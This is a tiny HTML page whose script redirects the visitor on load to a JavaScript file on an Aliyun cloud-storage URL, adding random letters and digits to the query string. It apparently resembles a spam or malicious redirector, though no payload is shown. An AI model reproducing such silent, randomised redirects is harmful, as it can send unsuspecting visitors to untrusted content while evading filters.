<html>
<script>


var urls=[
  	'https://vcsgamefile.oss-cn-hangzhou.aliyuncs.com/accountAssistant/archiveLoadingFailed/dlqq6ce714cc023/10.118.8.88-2023-08-09%2017%3A40%3A23.js?asdqwezxcasdqwww?{wwww}{nnnn}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
</script>
